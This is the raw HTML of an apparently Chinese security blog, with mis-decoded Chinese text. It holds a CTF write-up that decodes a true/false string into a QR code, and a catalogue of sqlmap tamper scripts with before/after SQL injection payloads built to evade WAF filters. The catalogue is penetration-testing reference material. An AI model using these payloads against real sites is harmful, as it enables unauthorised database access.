                                            rel="noopener">https://www.runoob.com/</a></p>


                                </div>


                                <footer class="post-footer">


                                    <div class="post-eof"></div>

                                </footer>
                            </div>


                        </article>


                        <article class="post post-type-normal" itemscope
                                 itemtype="http://schema.org/Article">


                            <div class="post-block">
                                <link itemprop="mainEntityOfPage"
                                      href="http://yoursite.com/2019/09/21/misc-ctf/">

                                <span hidden itemprop="author" itemscope
                                      itemtype="http://schema.org/Person">
      <meta itemprop="name" content="å°çŒªä½©å¥‡">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.ico">
    </span>

                                <span hidden itemprop="publisher" itemscope
                                      itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sec-Communication">
    </span>


                                <header class="post-header">


                                    <h1 class="post-title" itemprop="name headline">

                                        <a class="post-title-link" href="/2019/09/21/misc-ctf/"
                                           itemprop="url">misc-ctf</a></h1>


                                    <div class="post-meta">
          <span class="post-time">

              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>

                <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished"
                    datetime="2019-09-21T00:00:00+08:00">
                2019-09-21
              </time>





          </span>


                                    </div>
                                </header>


                                <div class="post-body" itemprop="articleBody">


                                    <h1 id="çœŸçœŸå‡å‡"><a href="#çœŸçœŸå‡å‡" class="headerlink"
                                                     title="çœŸçœŸå‡å‡"></a>çœŸçœŸå‡å‡</h1>
                                    <p>å¼€å±€é¢˜ç›®æè¿°</p>
                                    <pre><code>çœŸçœŸçœŸçœŸçœŸçœŸçœŸå‡å‡å‡çœŸå‡çœŸå‡çœŸå‡å‡å‡å‡çœŸå‡å‡çœŸçœŸçœŸçœŸçœŸçœŸçœŸçœŸå‡å‡å‡å‡å‡çœŸå‡å‡å‡çœŸå‡çœŸçœŸçœŸçœŸå‡å‡å‡å‡çœŸå‡çœŸå‡å‡å‡å‡å‡çœŸçœŸå‡çœŸçœŸçœŸå‡çœŸå‡çœŸå‡çœŸå‡å‡å‡çœŸçœŸå‡å‡å‡å‡å‡å‡çœŸå‡çœŸçœŸçœŸå‡çœŸçœŸå‡çœŸçœŸçœŸå‡çœŸå‡çœŸçœŸçœŸå‡çœŸçœŸçœŸçœŸçœŸçœŸçœŸå‡å‡å‡çœŸå‡çœŸçœŸçœŸå‡çœŸçœŸå‡çœŸçœŸçœŸå‡çœŸå‡çœŸçœŸå‡çœŸçœŸçœŸçœŸå‡å‡çœŸå‡çœŸçœŸå‡çœŸå‡çœŸçœŸçœŸå‡çœŸçœŸå‡å‡å‡å‡å‡çœŸå‡çœŸå‡çœŸå‡å‡å‡çœŸçœŸçœŸå‡çœŸå‡çœŸå‡çœŸå‡å‡å‡å‡å‡çœŸçœŸçœŸçœŸçœŸçœŸçœŸçœŸå‡çœŸå‡çœŸå‡çœŸå‡çœŸå‡çœŸå‡çœŸå‡çœŸå‡çœŸçœŸçœŸçœŸçœŸçœŸçœŸå‡å‡å‡å‡å‡å‡å‡å‡çœŸå‡å‡å‡çœŸå‡çœŸçœŸå‡å‡å‡å‡å‡å‡å‡å‡å‡å‡å‡å‡å‡çœŸå‡çœŸçœŸçœŸçœŸçœŸå‡å‡å‡çœŸçœŸå‡å‡å‡çœŸå‡çœŸå‡å‡çœŸå‡çœŸçœŸçœŸçœŸçœŸå‡å‡çœŸçœŸå‡çœŸçœŸå‡å‡å‡çœŸçœŸçœŸçœŸçœŸçœŸå‡å‡çœŸå‡çœŸçœŸå‡çœŸçœŸçœŸçœŸçœŸå‡çœŸçœŸçœŸå‡å‡çœŸçœŸçœŸçœŸçœŸçœŸçœŸå‡çœŸçœŸçœŸçœŸçœŸå‡çœŸçœŸå‡çœŸçœŸå‡å‡å‡çœŸçœŸå‡å‡çœŸçœŸçœŸå‡çœŸå‡å‡å‡å‡çœŸçœŸçœŸå‡çœŸå‡çœŸçœŸå‡å‡çœŸå‡çœŸçœŸå‡çœŸçœŸå‡å‡å‡çœŸçœŸçœŸå‡å‡çœŸçœŸå‡å‡å‡çœŸçœŸçœŸå‡çœŸçœŸçœŸçœŸçœŸå‡å‡çœŸå‡çœŸå‡çœŸçœŸçœŸå‡å‡çœŸå‡å‡å‡å‡å‡çœŸå‡çœŸå‡å‡çœŸå‡å‡å‡å‡å‡å‡çœŸçœŸå‡çœŸå‡çœŸå‡çœŸçœŸçœŸå‡å‡çœŸçœŸçœŸå‡çœŸå‡çœŸçœŸçœŸçœŸå‡å‡å‡çœŸå‡å‡çœŸå‡å‡çœŸå‡å‡å‡çœŸçœŸå‡å‡çœŸå‡çœŸçœŸçœŸçœŸå‡çœŸå‡å‡å‡çœŸå‡å‡çœŸå‡çœŸå‡å‡çœŸå‡çœŸå‡å‡çœŸå‡å‡çœŸå‡å‡çœŸå‡å‡å‡çœŸçœŸå‡å‡çœŸçœŸçœŸå‡å‡å‡çœŸå‡çœŸçœŸå‡å‡çœŸå‡å‡å‡çœŸçœŸå‡çœŸçœŸå‡å‡çœŸçœŸçœŸå‡çœŸçœŸçœŸçœŸçœŸå‡çœŸçœŸå‡çœŸå‡å‡çœŸçœŸå‡çœŸçœŸçœŸå‡å‡çœŸçœŸçœŸå‡çœŸå‡çœŸçœŸçœŸçœŸå‡å‡å‡çœŸçœŸçœŸçœŸçœŸå‡çœŸçœŸå‡çœŸçœŸå‡å‡çœŸå‡çœŸå‡å‡çœŸå‡çœŸçœŸå‡å‡å‡å‡çœŸçœŸçœŸå‡çœŸçœŸå‡å‡å‡å‡å‡çœŸå‡å‡å‡å‡çœŸå‡å‡çœŸçœŸçœŸå‡çœŸçœŸå‡å‡çœŸçœŸçœŸçœŸçœŸå‡çœŸå‡çœŸçœŸçœŸçœŸçœŸå‡çœŸçœŸçœŸçœŸçœŸçœŸçœŸå‡å‡å‡å‡å‡å‡å‡å‡å‡å‡çœŸå‡çœŸçœŸå‡å‡å‡å‡å‡å‡å‡å‡çœŸå‡å‡å‡çœŸå‡å‡çœŸçœŸçœŸçœŸçœŸçœŸçœŸçœŸçœŸå‡å‡çœŸçœŸå‡çœŸå‡å‡çœŸå‡å‡çœŸçœŸçœŸå‡çœŸå‡çœŸçœŸå‡å‡å‡çœŸå‡å‡å‡å‡å‡çœŸå‡çœŸçœŸçœŸå‡çœŸå‡çœŸçœŸçœŸå‡å‡çœŸçœŸå‡å‡å‡çœŸå‡å‡çœŸçœŸçœŸå‡çœŸçœŸçœŸå‡çœŸå‡çœŸå‡å‡çœŸçœŸå‡å‡çœŸå‡çœŸçœŸå‡çœŸçœŸçœŸçœŸçœŸçœŸçœŸå‡å‡çœŸå‡çœŸçœŸçœŸå‡çœŸå‡çœŸå‡çœŸçœŸçœŸçœŸçœŸå‡çœŸå‡å‡çœŸçœŸçœŸå‡çœŸå‡å‡çœŸçœŸçœŸçœŸå‡çœŸçœŸçœŸå‡çœŸå‡çœŸçœŸçœŸçœŸçœŸçœŸå‡çœŸå‡çœŸå‡å‡å‡å‡çœŸå‡çœŸçœŸå‡çœŸå‡çœŸå‡å‡å‡å‡å‡çœŸå‡å‡çœŸå‡å‡å‡çœŸçœŸçœŸçœŸå‡çœŸå‡çœŸçœŸçœŸçœŸçœŸå‡å‡çœŸå‡çœŸçœŸçœŸçœŸçœŸçœŸçœŸå‡çœŸå‡å‡çœŸå‡å‡å‡çœŸå‡çœŸå‡çœŸå‡å‡å‡å‡å‡çœŸçœŸå‡å‡</code></pre>
                                    <p>å¾ˆç›´æ¥ï¼ŒçœŸæ›¿æ¢1ï¼Œå‡æ›¿æ¢0ã€‚</p>
                                    <pre><code>1111111000101010000100111111110000010001011110000101000001101110101010001100000010111011011101011101111111000101110110111010110111100101101011101100000101010001110101010000011111111010101010101010111111100000000100010110000000000000101111100011000101001011111001101100011111100101101111101110011111110111110110110001100111010000111010110010110110001110011000111011111001010111001000001010010000001101010111001110101111000100100100011001011110100010010100101001001001000110011100010110010001101100111011111011010011011100111010111100011111011011001010010110000111011000001000010011101100111110101111101111111000000000010110000000010001001111111110011010010011101011000100000101110101110011000100111011101010011001011011111110010111010101111101001110100111101110101111110101000010110101000001001000111101011111001011111110100100010101000001100</code></pre>
                                    <p>ä¸€å…±å…«ç™¾å››åä¸€ä¸ªå­—ç¬¦ï¼Œ29*29çš„æ–¹é˜µã€‚åœ¨wordä¸­å­—ç¬¦æ›¿æ¢ç›´æ¥æ‰«ç </p>
                                    <p>0æ›¿æ¢â–¡ï¼Œ1æ›¿æ¢â–  å³å¯</p>
                                    <p><img src="http://47.106.185.69/1/./img/1569413385.jpg" alt>
                                    </p>


                                </div>


                                <footer class="post-footer">


                                    <div class="post-eof"></div>

                                </footer>
                            </div>


                        </article>


                        <article class="post post-type-normal" itemscope
                                 itemtype="http://schema.org/Article">


                            <div class="post-block">
                                <link itemprop="mainEntityOfPage"
                                      href="http://yoursite.com/2019/09/19/sqlmapåŠtamperç”¨æ³•/">

                                <span hidden itemprop="author" itemscope
                                      itemtype="http://schema.org/Person">
      <meta itemprop="name" content="å°çŒªä½©å¥‡">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.ico">
    </span>

                                <span hidden itemprop="publisher" itemscope
                                      itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sec-Communication">
    </span>


                                <header class="post-header">


                                    <h1 class="post-title" itemprop="name headline">

                                        <a class="post-title-link"
                                           href="/2019/09/19/sqlmapåŠtamperç”¨æ³•/" itemprop="url">sqlmapåŠtamperç”¨æ³•</a>
                                    </h1>


                                    <div class="post-meta">
          <span class="post-time">

              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>

                <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished"
                    datetime="2019-09-19T00:00:00+08:00">
                2019-09-19
              </time>





          </span>


                                    </div>
                                </header>


                                <div class="post-body" itemprop="articleBody">


                                    <h1 id="è‡ªå¸¦tamperåŠç”¨æ³•"><a href="#è‡ªå¸¦tamperåŠç”¨æ³•" class="headerlink"
                                                            title="è‡ªå¸¦tamperåŠç”¨æ³•"></a>è‡ªå¸¦tamperåŠç”¨æ³•</h1>
                                    <h4 id="apostrophemask-py"><a href="#apostrophemask-py"
                                                                  class="headerlink"
                                                                  title="apostrophemask.py"></a><strong>apostrophemask.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šå°†å¼•å·æ›¿æ¢ä¸ºutf-8ï¼Œç”¨äºè¿‡æ»¤å•å¼•å·<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&quot;1
                                        AND &#39;1&#39;=&#39;1&quot;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>1 AND
                                        %EF%BC%871%EF%BC%87=%EF%BC%871</code></p>
                                    <h4 id="base64encode-py"><a href="#base64encode-py"
                                                                class="headerlink"
                                                                title="base64encode.py"></a><strong>base64encode.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šæ›¿æ¢ä¸ºbase64ç¼–ç <br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&quot;1&#39;
                                        AND SLEEP(5)#&quot;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>MScgQU5EIFNMRUVQKDUpIw==</code>
                                    </p>
                                    <h4 id="multiplespaces-py"><a href="#multiplespaces-py"
                                                                  class="headerlink"
                                                                  title="multiplespaces.py"></a><strong>multiplespaces.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šå›´ç»•sqlå…³é”®å­—æ·»åŠ å¤šä¸ªç©ºæ ¼<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;1
                                        UNION SELECT foobar&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>1 UNION
                                        SELECT foobar</code></p>
                                    <h4 id="space2plus-py"><a href="#space2plus-py"
                                                              class="headerlink"
                                                              title="space2plus.py"></a><strong>space2plus.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šç”¨åŠ å·æ›¿æ¢ç©ºæ ¼<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;SELECT id
                                        FROM
                                        users&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>SELECT+id+FROM+users</code>
                                    </p>
                                    <h4 id="nonrecursivereplacement-py"><a
                                            href="#nonrecursivereplacement-py" class="headerlink"
                                            title="nonrecursivereplacement.py"></a><strong>nonrecursivereplacement.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šä½œä¸ºåŒé‡æŸ¥è¯¢è¯­å¥ï¼Œç”¨åŒé‡è¯­å¥æ›¿ä»£é¢„å®šä¹‰çš„sqlå…³é”®å­—ï¼ˆé€‚ç”¨äºéå¸¸å¼±çš„è‡ªå®šä¹‰è¿‡æ»¤å™¨ï¼Œä¾‹å¦‚å°†selectæ›¿æ¢ä¸ºç©ºï¼‰<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;1
                                        UNION SELECT 2--&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>1 UNIOUNIONN
                                        SELESELECTCT 2--</code></p>
                                    <h4 id="space2randomblank-py"><a href="#space2randomblank-py"
                                                                     class="headerlink"
                                                                     title="space2randomblank.py"></a><strong>space2randomblank.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºå…¶ä»–æœ‰æ•ˆå­—ç¬¦<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;SELECT
                                        id FROM users&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>SELECT%0Did%0DFROM%0Ausers</code>
                                    </p>
                                    <h4 id="unionalltounion-py"><a href="#unionalltounion-py"
                                                                   class="headerlink"
                                                                   title="unionalltounion.py"></a><strong>unionalltounion.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šå°†<code>union allselect</code> æ›¿æ¢ä¸º<code>unionselect</code><br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;-1
                                        UNION ALL SELECT&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>-1 UNION
                                        SELECT</code></p>
                                    <h4 id="securesphere-py"><a href="#securesphere-py"
                                                                class="headerlink"
                                                                title="securesphere.py"></a><strong>securesphere.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šè¿½åŠ ç‰¹å®šçš„å­—ç¬¦ä¸²<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;1 AND 1=1&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>1
                                        AND 1=1 and &#39;0having&#39;=&#39;0having&#39;</code></p>
                                    <h4 id="space2dash-py"><a href="#space2dash-py"
                                                              class="headerlink"
                                                              title="space2dash.py"></a><strong>space2dash.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br>ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º<code>--</code>ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;1
                                        AND 9227=9227&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227</code>
                                    </p>
                                    <h4 id="space2mssqlblank-py"><a href="#space2mssqlblank-py"
                                                                    class="headerlink"
                                                                    title="space2mssqlblank.py"></a><strong>space2mssqlblank.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šMicrosoft SQL Server<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server
                                        2000ã€Microsoft SQL Server 2005<br>ä½œç”¨ï¼šå°†ç©ºæ ¼éšæœºæ›¿æ¢ä¸ºå…¶ä»–ç©ºæ ¼ç¬¦å·<code>(&#39;%01&#39;,
                                            &#39;%02&#39;, &#39;%03&#39;, &#39;%04&#39;, &#39;%05&#39;,
                                            &#39;%06&#39;, &#39;%07&#39;, &#39;%08&#39;, &#39;%09&#39;,
                                            &#39;%0B&#39;, &#39;%0C&#39;, &#39;%0D&#39;, &#39;%0E&#39;,
                                            &#39;%0F&#39;, &#39;%0A&#39;)</code><br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;SELECT
                                            id FROM users&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>SELECT%0Eid%0DFROM%07users</code>
                                    </p>
                                    <h4 id="between-py"><a href="#between-py" class="headerlink"
                                                           title="between.py"></a><strong>between.py</strong>
                                    </h4>
                                    <p>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle
                                        10gã€PostgreSQL 8.3, 8.4, 9.0<br>ä½œç”¨ï¼šç”¨<code>NOT BETWEEN 0 AND
                                            #</code>æ›¿æ¢<code>&gt;</code><br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;1
                                            AND A &gt; B--&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>1 AND A NOT
                                            BETWEEN 0 AND B--</code></p>
                                    <h4 id="percentage-py"><a href="#percentage-py"
                                                              class="headerlink"
                                                              title="percentage.py"></a><strong>percentage.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šASP<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2000, 2005ã€MySQL
                                        5.1.56, 5.5.11ã€PostgreSQL 9.0<br>ä½œç”¨ï¼šåœ¨æ¯ä¸ªå­—ç¬¦å‰æ·»åŠ ä¸€ä¸ª<code>%</code><br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;SELECT
                                            FIELD FROM TABLE&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>%S%E%L%E%C%T
                                            %F%I%E%L%D %F%R%O%M %T%A%B%L%E</code></p>
                                    <h4 id="sp-password-py"><a href="#sp-password-py"
                                                               class="headerlink"
                                                               title="sp_password.py"></a><strong>sp_password.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šMSSQL<br>ä½œç”¨ï¼šä»T-SQLæ—¥å¿—çš„è‡ªåŠ¨è¿·ç³Šå¤„ç†çš„æœ‰æ•ˆè½½è·ä¸­è¿½åŠ sp_password<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;1
                                        AND 9227=9227-- &#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>1 AND
                                        9227=9227-- sp_password</code></p>
                                    <h4 id="charencode-py"><a href="#charencode-py"
                                                              class="headerlink"
                                                              title="charencode.py"></a><strong>charencode.py</strong>
                                    </h4>
                                    <p>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle
                                        10gã€PostgreSQL 8.3, 8.4, 9.0<br>ä½œç”¨ï¼šå¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨urlç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;SELECT
                                            FIELD FROM%20TABLE&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</code>
                                    </p>
                                    <h4 id="randomcase-py"><a href="#randomcase-py"
                                                              class="headerlink"
                                                              title="randomcase.py"></a><strong>randomcase.py</strong>
                                    </h4>
                                    <p>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle
                                        10gã€PostgreSQL 8.3, 8.4, 9.0<br>ä½œç”¨ï¼šéšæœºå¤§å°å†™<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;INSERT&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>INseRt</code>
                                    </p>
                                    <h4 id="charunicodeencode-py"><a href="#charunicodeencode-py"
                                                                     class="headerlink"
                                                                     title="charunicodeencode.py"></a><strong>charunicodeencode.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šASPã€ASP.NET<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server
                                        2000/2005ã€MySQL 5.1.56ã€PostgreSQL 9.0.3<br>ä½œç”¨ï¼šé€‚ç”¨å­—ç¬¦ä¸²çš„unicodeç¼–ç <br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;SELECT
                                            FIELD%20FROM TABLE&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</code>
                                    </p>
                                    <h4 id="space2comment-py"><a href="#space2comment-py"
                                                                 class="headerlink"
                                                                 title="space2comment.py"></a><strong>space2comment.py</strong>
                                    </h4>
                                    <p>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle
                                        10gã€PostgreSQL 8.3, 8.4,
                                        9.0<br>ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º<code>/**/</code><br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;SELECT
                                            id FROM users&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>SELECT/**/id/**/FROM/**/users</code>
                                    </p>
                                    <h4 id="equaltolike-py"><a href="#equaltolike-py"
                                                               class="headerlink"
                                                               title="equaltolike.py"></a><strong>equaltolike.py</strong>
                                    </h4>
                                    <p>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5<br>ä½œç”¨ï¼šå°†<code>=</code>æ›¿æ¢ä¸º<code>LIKE</code><br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;SELECT
                                        * FROM users WHERE id=1&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>SELECT *
                                        FROM users WHERE id LIKE 1</code></p>
                                    <h4 id="equaltolike-py-1"><a href="#equaltolike-py-1"
                                                                 class="headerlink"
                                                                 title="equaltolike.py"></a><strong>equaltolike.py</strong>
                                    </h4>
                                    <p>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4,
                                        9.0<br>ä½œç”¨ï¼šå°†<code>&gt;</code>æ›¿æ¢ä¸ºGREATESTï¼Œç»•è¿‡å¯¹<code>&gt;</code>çš„è¿‡æ»¤<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;1
                                            AND A &gt; B&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>1 AND
                                            GREATEST(A,B+1)=A</code></p>
                                    <h4 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py"
                                                                   class="headerlink"
                                                                   title="ifnull2ifisnull.py"></a><strong>ifnull2ifisnull.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šMySQLã€SQLite (possibly)ã€SAP MaxDB (possibly)<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL
                                        5.0 and 5.5<br>ä½œç”¨ï¼šå°†ç±»ä¼¼äº<code>IFNULL(A, B)</code>æ›¿æ¢ä¸º<code>IF(ISNULL(A),
                                            B, A)</code>ï¼Œç»•è¿‡å¯¹<code>IFNULL</code>çš„è¿‡æ»¤<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;IFNULL(1,
                                            2)&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>IF(ISNULL(1),2,1)</code>
                                    </p>
                                    <h4 id="modsecurityversioned-py"><a
                                            href="#modsecurityversioned-py" class="headerlink"
                                            title="modsecurityversioned.py"></a><strong>modsecurityversioned.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šMySQL<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0<br>ä½œç”¨ï¼šè¿‡æ»¤ç©ºæ ¼ï¼Œä½¿ç”¨mysqlå†…è”æ³¨é‡Šçš„æ–¹å¼è¿›è¡Œæ³¨å…¥<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;1
                                        AND 2&gt;1--&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>1 /*!30874AND 2&gt;1*/--</code>
                                    </p>
                                    <h4 id="space2mysqlblank-py"><a href="#space2mysqlblank-py"
                                                                    class="headerlink"
                                                                    title="space2mysqlblank.py"></a><strong>space2mysqlblank.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šMySQL<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1<br>ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºå…¶ä»–ç©ºæ ¼ç¬¦å·<code>(&#39;%09&#39;,
                                        &#39;%0A&#39;, &#39;%0C&#39;, &#39;%0D&#39;,
                                        &#39;%0B&#39;)</code><br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;SELECT id
                                        FROM users&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>SELECT%0Bid%0DFROM%0Cusers</code>
                                    </p>
                                    <h4 id="modsecurityzeroversioned-py"><a
                                            href="#modsecurityzeroversioned-py" class="headerlink"
                                            title="modsecurityzeroversioned.py"></a><strong>modsecurityzeroversioned.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šMySQL<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0<br>ä½œç”¨ï¼šä½¿ç”¨å†…è”æ³¨é‡Šæ–¹å¼<code>ï¼ˆ/*!00000*/ï¼‰</code>è¿›è¡Œæ³¨å…¥<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;1
                                        AND 2&gt;1--&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>1 /*!00000AND 2&gt;1*/--</code>
                                    </p>
                                    <h4 id="space2mysqldash-py"><a href="#space2mysqldash-py"
                                                                   class="headerlink"
                                                                   title="space2mysqldash.py"></a><strong>space2mysqldash.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šMySQLã€MSSQL<br>ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º <code>--</code> ï¼Œå¹¶è¿½éšä¸€ä¸ªæ¢è¡Œç¬¦<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;1
                                        AND 9227=9227&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>1--%0AAND--%0A9227=9227</code>
                                    </p>
                                    <h4 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink"
                                                            title="bluecoat.py"></a><strong>bluecoat.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šBlue Coat SGOS<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1,ã€SGOS<br>ä½œç”¨ï¼šåœ¨sqlè¯­å¥ä¹‹åç”¨æœ‰æ•ˆçš„éšæœºç©ºç™½å­—ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦ï¼Œéšåç”¨<code>LIKE</code>æ›¿æ¢<code>=</code><br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;SELECT
                                        id FROM users where id = 1&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>SELECT%09id
                                        FROM users where id LIKE 1</code></p>
                                    <h4 id="versionedkeywords-py"><a href="#versionedkeywords-py"
                                                                     class="headerlink"
                                                                     title="versionedkeywords.py"></a><strong>versionedkeywords.py</strong>
                                    </h4>
                                    <p>é€‚ç”¨æ•°æ®åº“ï¼šMySQL<br>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4.0.18, 5.1.56, 5.5.11<br>ä½œç”¨ï¼šæ³¨é‡Šç»•è¿‡<br>ä½¿ç”¨è„šæœ¬å‰ï¼š<code>tamper(&#39;1
                                        UNION ALL SELECT NULL, NULL,
                                        CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS
                                        CHAR),CHAR(32)),CHAR(58,100,114,117,58))#&#39;)</code><br>ä½¿ç”¨è„šæœ¬åï¼š<code>1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,
